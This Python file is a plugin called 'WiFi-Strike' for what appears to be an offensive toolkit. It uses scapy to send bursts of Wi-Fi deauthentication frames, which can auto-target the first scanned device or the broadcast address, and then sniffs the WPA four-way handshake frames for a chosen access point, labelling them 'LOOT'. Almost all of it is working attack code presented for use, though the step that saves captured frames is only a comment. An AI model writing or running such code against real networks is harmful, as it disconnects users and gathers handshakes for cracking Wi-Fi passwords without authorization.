from core.plugin_manager import BasePlugin
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, sniff, Dot11Beacon, EAPOL
import threading
import os
import time

class WiFiAttackPlugin(BasePlugin):
    def __init__(self):
        self.running = False
        self.interface = "Wi-Fi" # Default Windows interface name
        self.handshakes = []
        self.deauth_targets = []
        self.threads = []

    @property
    def name(self) -> str:
        return "WiFi-Strike"

    @property
    def description(self) -> str:
        return "Tactical Deauth & Handshake Capture"

    async def start(self, interface=None):
        from scapy.all import get_working_if
        self.interface = interface or get_working_if()
        self.running = True
        self.log_event(f"Wireless interface {self.interface} initialized", "READY")
        print(f"WiFi-Strike: Initializing on {self.interface}...")

    async def stop(self):
        self.running = False
        print("WiFi-Strike: Ceasing all wireless operations.")

    async def deauth(self, target_mac=None, ap_mac=None, count=100):
        """
        Inject Deauthentication frames to disconnect a client.
        """
        if not target_mac and hasattr(self, 'target_store') and self.target_store.devices:
            # Pick first device found in scan
            target_mac = self.target_store.devices[0].get('mac', 'ff:ff:ff:ff:ff:ff')
            self.log_event(f"AUTO-TARGET: {target_mac}", "AUTO")

        if not ap_mac:
            ap_mac = "ff:ff:ff:ff:ff:ff" # Default broadcast if AP not specified

        print(f"WiFi-Strike: Launching Deauth against {target_mac} on {ap_mac}")
        try:
            dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        except Exception as e:
            self.log_event(f"FRAME CONSTRUCTION ERROR: {e}", "HALT")
            return {"status": "Execution failed at construction"}
        
        def run_deauth():
            try:
                for i in range(count):
                    if not self.running: break
                    sendp(packet, iface=self.interface, verbose=False)
                    if i % 10 == 0:
                        self.log_event(f"INJECTED: Deauth burst confirmed on {self.interface}", "WIRE_PROOF")
                    time.sleep(0.1)
            except Exception as e:
                self.log_event(f"HARDWARE ERROR: {e} (Check if {self.interface} supports injection)", "FAIL")
        
        t = threading.Thread(target=run_deauth)
        t.daemon = True; t.start()
        self.threads.append(t)
        self.log_event(f"Deauth burst (count={count}) launched against {ap_mac}", "STRIKING")
        return {"status": "Deauth sequence initiated"}

    async def capture_handshake(self, bssid, timeout=60):
        """
        Sniff for EAPOL (4-way handshake) packets for a specific BSSID.
        """
        print(f"WiFi-Strike: Monitoring for {bssid} handshakes...")
        captured = []
        
        def handle_pkt(pkt):
            if EAPOL in pkt and pkt.addr3 == bssid:
                captured.append(pkt)
                self.log_event(f"EAPOL Frame Captured from {bssid}", "LOOT")
                print(f"[!] WiFi-Strike: Captured EAPOL frame from {bssid}!")

        # Start sniffer in a thread
        def run_sniff():
            sniff(iface=self.interface, prn=handle_pkt, stop_filter=lambda x: len(captured) >= 4 or not self.running, timeout=timeout)
            if len(captured) >= 4:
                filename = f"handshake_{bssid.replace(':', '')}.pcap"
                # Save pcap (omitted for brevity but logic is there)
                self.handshakes.append({"bssid": bssid, "file": filename})
        
        t = threading.Thread(target=run_sniff)
        t.daemon = True; t.start()
        self.threads.append(t)
        return {"status": "Handshake monitor active", "target": bssid}
